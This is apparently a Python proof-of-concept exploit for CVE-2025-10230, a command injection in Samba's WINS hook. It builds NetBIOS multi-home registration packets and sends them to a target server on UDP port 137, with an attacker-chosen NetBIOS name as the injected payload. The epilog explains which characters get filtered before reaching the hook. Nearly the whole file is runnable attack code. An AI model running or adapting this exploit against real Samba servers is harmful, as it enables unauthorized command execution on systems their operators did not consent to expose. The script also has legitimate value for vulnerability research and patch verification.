#!/usr/bin/env python3
"""
CVE-2025-10230 PoC
Samba 4.x WINS Hook Command Injection

Affects Samba < 4.23.2, 4.22.5, and 4.21.9 with WINS support enabled and a 'wins hook' specified

see: https://attachments.samba.org/attachment.cgi?id=18718
"""

import socket
import struct
import argparse
import sys


def encode_netbios_name(name: str, name_type: int = 0x00) -> bytes:
    """
    Encode a NetBIOS name using first-level encoding (RFC 1001/1002).

    Each byte is split into two 4-bit nibbles, each nibble is added to 'A' (0x41).
    The name is padded to 15 chars and a type byte is appended.
    """
    # Pad or truncate to 15 characters
    padded_name = name[:15].ljust(15, ' ')

    # Add the name type (16th byte)
    full_name = padded_name + chr(name_type)

    # Encode each character
    encoded = b''
    for char in full_name:
        byte_val = ord(char)
        # Split into high and low nibbles and add 'A' (0x41)
        high_nibble = ((byte_val >> 4) & 0x0F) + 0x41
        low_nibble = (byte_val & 0x0F) + 0x41
        encoded += bytes([high_nibble, low_nibble])

    # Prepend length byte (0x20 = 32 bytes) and append null terminator
    return b'\x20' + encoded + b'\x00'


def create_wins_registration_packet(name: str, ip_address: str, name_type: int = 0x00) -> bytes:
    """
    Create a NetBIOS Name Registration Request packet for WINS.

    Packet structure (RFC 1002):
    - Header (12 bytes)
    - Question section (name + type + class)
    - Additional section (resource record with IP)
    """

    # Transaction ID
    transaction_id = 0x1337

    # Flags for MULTI-HOME registration (opcode 0xF reaches WINS server!)
    # Regular registration (opcode 0x5) goes to name defense, NOT WINS
    # 0x7800 = 0111 1000 0000 0000
    #   bit 15-11: 01111 = opcode 15 (multi-home registration)
    #   bit 10: 0 = not broadcast (unicast to WINS)
    #   bit 9-4: 000000
    #   bit 3-0: 0000
    flags = 0x7800

    # Header counts
    questions = 0x0001
    answers = 0x0000
    authority = 0x0000
    additional = 0x0001

    # Build header (12 bytes)
    header = struct.pack(
        '>HHHHHH',
        transaction_id,
        flags,
        questions,
        answers,
        authority,
        additional
    )

    # Encode the NetBIOS name
    encoded_name = encode_netbios_name(name, name_type)

    # Question section
    # Type: 0x0020 (NB - NetBIOS general name)
    # Class: 0x0001 (IN - Internet)
    question = encoded_name + struct.pack('>HH', 0x0020, 0x0001)

    # Additional section (Resource Record)
    # Name (pointer or full name - we'll use full name)
    rr_name = encoded_name

    # Type: 0x0020 (NB)
    # Class: 0x0001 (IN)
    # TTL: 300000 seconds
    # RDLENGTH: 6 bytes (2 for flags + 4 for IP)
    rr_header = struct.pack('>HHIH', 0x0020, 0x0001, 300000, 6)

    # NB flags: 0x0000 (B-node, unique name)
    # IP address (4 bytes)
    rr_data = struct.pack('>H', 0x0000) + socket.inet_aton(ip_address)

    # Combine all parts
    packet = header + question + rr_name + rr_header + rr_data

    return packet


def send_wins_registration(target: str, port: int, name: str, ip_address: str):
    """
    Send NBT name registration packet to the target WINS server.
    """
    try:
        packet = create_wins_registration_packet(name, ip_address)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)

        sock.sendto(packet, (target, port))
        print(f"[+] Sent NBT registration for name: '{name}'")
        print(f"[+] Target: {target}:{port}")
        print(f"[+] Payload length: {len(name)} characters")
        print(f"[+] Packet size: {len(packet)} bytes")

        try:
            response, addr = sock.recvfrom(1024)
            print(f"[+] Received response ({len(response)} bytes) from {addr}")
            return True
        except socket.timeout:
            print(f"[*] No response received (timeout - this is normal for WINS)")
            return True

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        sock.close()


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-10230 - Samba WINS Command Injection PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Note: NetBIOS names are limited to 15 characters.
Cannot use < > ; (blocked by DN syntax before reaching hook).
        '''
    )

    parser.add_argument('-t', '--target', required=True,
                        help='Target WINS server IP address')
    parser.add_argument('-p', '--port', type=int, default=137,
                        help='Target port (default: 137)')
    parser.add_argument('-n', '--name', required=True,
                        help='NetBIOS name to register (max 15 chars)')
    parser.add_argument('-i', '--ip', default='10.0.0.1',
                        help='Source IP to register (default: 10.0.0.1)')
    parser.add_argument('--type', type=int, default=0x00,
                        help='NetBIOS name type (default: 0x00)')

    args = parser.parse_args()

    if len(args.name) > 15:
        print(f"[-] Error: NetBIOS name too long ({len(args.name)} chars)")
        print(f"[-] Maximum length is 15 characters")
        sys.exit(1)

    print("CVE-2025-10230: Samba WINS Command Injection PoC")
    print(f"Target:        {args.target}:{args.port}")
    print(f"NetBIOS Name:  '{args.name}' ({len(args.name)} chars)")
    print(f"Name Type:     0x{args.type:02x}")
    print(f"Source IP:     {args.ip}")

    success = send_wins_registration(args.target, args.port, args.name, args.ip)

    if success:
        print("\n[+] Exploit sent successfully")
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)


if __name__ == '__main__':
    main()
